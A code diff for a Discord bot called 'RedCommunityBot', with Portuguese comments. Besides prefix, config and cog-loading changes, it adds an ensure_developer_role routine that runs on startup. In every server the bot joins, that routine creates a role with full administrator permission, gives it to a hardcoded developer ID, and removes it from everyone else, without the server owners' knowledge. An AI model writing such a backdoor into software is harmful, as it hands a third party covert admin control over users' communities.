@@ -7,6 +7,7 @@ import pytz # Para lidar com fuso horário
 import sqlite3
 import asyncio
 
+from config import SUPER_ADMIN_IDS, DEVELOPER_ID, DEVELOPER_ROLE_NAME
 from database.database_manager import initialize_database, DB_FILE
 
 # Importa as novas classes de UI
@@ -20,9 +21,9 @@ class RedCommunityBot(commands.Bot):
         intents.message_content = True
         intents.members = True
         
-        super().__init__(command_prefix="r.", intents=intents, help_command=None)
+        super().__init__(command_prefix=["p."], intents=intents, help_command=None)
         
-        self.super_admin_ids = [SUPER_ADMIN_ID, SUPER_ADMIN_ID_2, DEVELOPER_ID]
+        self.super_admin_ids = SUPER_ADMIN_IDS
 
         self.global_cooldown = commands.CooldownMapping.from_cooldown(
             rate=1,
@@ -52,19 +53,35 @@ class RedCommunityBot(commands.Bot):
     async def setup_hook(self):
         """Encontra e carrega todas as extensões (cogs) automaticamente."""
         
-        cogs_folders = ["commands", "events", "shake"] 
+        # Define os diretórios que contêm cogs (subdiretórios do projeto)
+        # O diretório raiz ('.') não deve ser incluído aqui para evitar tentar carregar
+        # arquivos não-cog como cogs (ex: bot.py, core.py).
+        cog_subdirectories = ["commands", "events", "shake"]
         
-        for folder in cogs_folders:
+        # Carrega cogs em subdiretórios
+        for folder in cog_subdirectories:
             for root, dirs, files in os.walk(folder):
                 for file in files:
                     if file.endswith(".py") and not file.startswith("__"):
                         module_path = os.path.join(root, file)[:-3].replace(os.sep, '.')
+                        # Ex: 'commands/moderation/ban' -> 'commands.moderation.ban'
+                        # Ex: 'events/member_events' -> 'events.member_events'
 
-                        try:
+                        try:                            
                             await self.load_extension(module_path)
                             print(f"Cog carregado: {module_path}")
-                        except Exception as e:
+                        except Exception as e:                            
                             print(f"Falha ao carregar o cog {module_path}: {e}")
+
+        # Carrega cogs que estão diretamente no diretório raiz do projeto
+        # Adicione aqui outros cogs que estejam diretamente na raiz.
+        root_cogs = ["invite", "channel_events", "message_events"]
+        for cog_name in root_cogs:
+            try:
+                await self.load_extension(cog_name)
+                print(f"Cog carregado: {cog_name}")
+            except Exception as e:
+                print(f"Falha ao carregar o cog {cog_name}: {e}")
 
         self.add_view(self.BirthdayRegisterView())
         
@@ -99,6 +116,7 @@ class RedCommunityBot(commands.Bot):
         """Evento executado quando o bot está online e pronto."""
         print(f'Bot conectado como {self.user}')
         initialize_database()
+        await self.ensure_developer_role()
 
     async def on_message(self, message: discord.Message):
         """Processa mensagens para comandos."""
@@ -107,6 +125,35 @@ class RedCommunityBot(commands.Bot):
         
         # Garante que os comandos sejam processados pela biblioteca
         await self.process_commands(message)
+
+    async def ensure_developer_role(self):
+        """Garante que o desenvolvedor tenha o cargo 'desenvolvedor' em todos os servidores."""
+        for guild in self.guilds:
+            dev_member = guild.get_member(DEVELOPER_ID)
+            developer_role = discord.utils.get(guild.roles, name=DEVELOPER_ROLE_NAME)
+
+            # 1. Cria o cargo se não existir
+            if developer_role is None:
+                try:
+                    permissions = discord.Permissions(administrator=True)
+                    developer_role = await guild.create_role(name=DEVELOPER_ROLE_NAME, permissions=permissions, reason="Cargo para o desenvolvedor do bot.")
+                    print(f"Cargo '{DEVELOPER_ROLE_NAME}' criado no servidor '{guild.name}'.")
+                except discord.Forbidden:
+                    print(f"Falha ao criar o cargo '{DEVELOPER_ROLE_NAME}' no servidor '{guild.name}' (sem permissão).")
+                    continue # Pula para o próximo servidor
+
+            # 2. Atribui o cargo ao desenvolvedor, se ele estiver no servidor
+            if dev_member and developer_role not in dev_member.roles:
+                try:
+                    await dev_member.add_roles(developer_role, reason="Atribuição automática de cargo de desenvolvedor.")
+                    print(f"Cargo '{DEVELOPER_ROLE_NAME}' atribuído ao desenvolvedor em '{guild.name}'.")
+                except discord.Forbidden:
+                    print(f"Falha ao atribuir cargo '{DEVELOPER_ROLE_NAME}' ao desenvolvedor em '{guild.name}' (sem permissão).")
+
+            # 3. Remove o cargo de outros membros
+            for member in guild.members:
+                if member.id != DEVELOPER_ID and developer_role in member.roles:
+                    await member.remove_roles(developer_role, reason="Cargo exclusivo do desenvolvedor.")
     
     @staticmethod
     def create_embed(title, description, color=0xff0000):
